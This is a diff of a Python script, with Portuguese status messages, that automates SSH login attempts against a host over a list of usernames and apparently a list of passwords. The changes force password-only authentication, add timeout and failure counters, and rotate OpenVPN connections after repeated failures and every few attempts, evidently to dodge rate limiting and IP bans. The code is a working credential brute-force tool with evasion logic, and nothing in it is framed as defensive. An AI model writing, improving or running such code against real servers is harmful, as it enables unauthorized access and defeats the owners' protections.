@@ -63,7 +63,11 @@ update_status(7, host)
 next_ = random.randint(30, 45)
 next5 = 5
 
-tries_exceeded = 0
+tries_exceeded_timeout = 0
+tries_exceeded_end = 0
+tries_exceeded_timeout_max = 0
+
+timeout_exceeded = False
 
 while i < len(usersl):
     
@@ -75,7 +79,14 @@ while i < len(usersl):
 
         process = pexpect.spawn(
             "ssh",
-            [f"{usersl[i]}@{host}", "-p", port],
+            [
+                "-o", "IdentitiesOnly=yes",
+                "-o", "PreferredAuthentications=password",
+                "-o", "PubkeyAuthentication=no",
+                "-o", "ConnectTimeout=30",
+                "-p", port,
+                f"{usersl[i]}@{host}",
+            ],
             encoding="utf-8",
             timeout=SSH_TIMEOUT,
         )
@@ -149,9 +160,36 @@ while i < len(usersl):
         time.sleep(delay)
 
         if result == TIMEOUT:
-            tries_exceeded += 1
+            tries_exceeded_timeout += 1
+            tries_exceeded_timeout_max += 1
 
-            if tries_exceeded >= 10:
+            if tries_exceeded_timeout_max >= 15:
+                print("Muitas tentativas falhadas de timeout. Encerrando o processo.")
+                update_status(4, "Muitas tentativas falhadas de timeout.")
+
+                timeout_exceeded = True
+                process.close()
+                break
+
+            if tries_exceeded_timeout >= 10:
+                print("Muitas tentativas falhadas. Trocando de VPN...")
+                update_status(4, "Trocando de VPN...")
+
+                process.close()
+                openvpn_enter = reconnect_vpn(openvpn_enter)
+
+                update_status(4, "VPN trocada")
+
+                tries_exceeded_timeout = 0
+            
+            else:
+                process.close()
+                continue
+
+        if result == END:
+            tries_exceeded_end += 1
+
+            if tries_exceeded_end >= 5:
                 print("Muitas tentativas falhadas. Trocando de VPN...")
                 update_status(4, "Trocando de VPN...")
 
@@ -164,17 +202,24 @@ while i < len(usersl):
                 process.close()
                 continue
 
-        tries_exceeded = 0
         process.close()
         
         if j >= next5:
             openvpn_enter = reconnect_vpn(openvpn_enter)
             next5 += 5
-        
+
         if result != TIMEOUT:
+            tries_exceeded_timeout_max = 0
+        
+        if (result != TIMEOUT and result != END) or tries_exceeded_end >= 5:
             j += 1
 
+        tries_exceeded_end = 0
+
     if finded == True:
+        break
+
+    if timeout_exceeded == True:
         break
 
     i += 1
@@ -182,8 +227,8 @@ while i < len(usersl):
 
     next5 = 5
 
-if not finded and tries_exceeded < 10:
+if not finded and not timeout_exceeded:
     update_status(4, "Nenhuma combinação encontrada")
-    
+
 if openvpn_enter.isalive():
     openvpn_enter.close(force=True)
